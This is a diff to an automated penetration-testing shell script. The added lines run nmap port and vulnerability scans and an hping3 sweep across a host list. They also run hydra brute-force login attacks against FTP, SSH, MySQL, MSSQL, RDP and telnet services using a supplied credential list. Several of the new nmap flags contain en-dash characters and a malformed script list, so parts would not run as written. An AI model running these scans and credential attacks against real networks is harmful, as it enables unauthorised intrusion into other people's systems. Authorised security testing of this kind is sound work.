@@ -25,7 +25,21 @@ if [ ! -d $SCAN_RESULTS_LOCATION ]; then
 fi
 
 #Port Scanning
-nmap -iL $HOME/$NETWORK -n -sT -sV -oA $SCAN_RESULTS_LOCATION/$NETWORK -vv -T4 -sC --open -Pn -n -p- --top-ports=100
+nmap -v --open –T4 –Pn –n –sS –F –oG /tmp/tcp.gnmap -iL $HOME/$NETWORK
+nmap -v --open –T4 –Pn –n –sY –F –oG /tmp/sctp.gnmap -iL $HOME/$NETWORK
+nmap -v --open –T4 –Pn –n –sU –p53,69,111,123,137,161,500,514,520 -oG /tmp/udp.gnmap -iL $HOME/$NETWORK
+grep open /tmp/*.gnmap | awk '{print $2}' | sort | uniq > $HOME/$NETWORK
+
+nmap -v -T3 -Pn -open –sU -oA $SCAN_RESULTS_LOCATION/udp -iL $HOME/$NETWORK
+
+nmap -iL $HOME/$NETWORK -n -sT -sV -oA $SCAN_RESULTS_LOCATION/$NETWORK -vv -T4 --script=broadcast,auth,default,firewalk,malware,vuln, discovery --open -Pn -n -p-
+
+mkdir -p $SCAN_RESULTS_LOCATION/hping3_results/
+
+for i in $(cat $HOME/$NETWORK)
+do
+	hping3 --scan known -S $i > $SCAN_RESULTS_LOCATION/hping3_results/hping3_$i.txt
+done
 
 #Create HTML of Nmap Scan Results
 xsltproc $SCAN_RESULTS_LOCATION/$NETWORK.xml -o $SCAN_RESULTS_LOCATION/$NETWORK.html
@@ -93,12 +107,12 @@ zenmap $SCAN_RESULTS_LOCATION/nmap_results/$NETWORK.xml &
 cd $HOME
 #Brute Force attacks
 #mkdir -p $SCAN_RESULTS_LOCATION/bruteforced_creds
-hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/22-TCP.txt ssh -f -t1 -W 1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/ssh.txt
-hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/3306-TCP.txt mysql -f -t1 -W 1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/mysql.txt
-hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/1443-TCP.txt mssql -f -t1 -W 1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/mssql.txt
-hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/21-TCP.txt ftp -f -t1 -W 1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/ftp.txt
-hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/3389-TCP.txt rdp -f -t1 -W 1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/rdp.txt
-hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/23-TCP.txt telnet -f -t1 -W 1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/telnet.txt
+hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/21-TCP.txt ftp -t1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/ftp.txt
+hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/22-TCP.txt ssh -t1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/ssh.txt
+hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/3306-TCP.txt mysql -t1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/mysql.txt
+hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/1443-TCP.txt mssql -t1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/mssql.txt
+hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/3389-TCP.txt rdp -t1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/rdp.txt
+hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/23-TCP.txt telnet -t1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/telnet.txt
 
 #Open results in IceWeasel
 firefox &
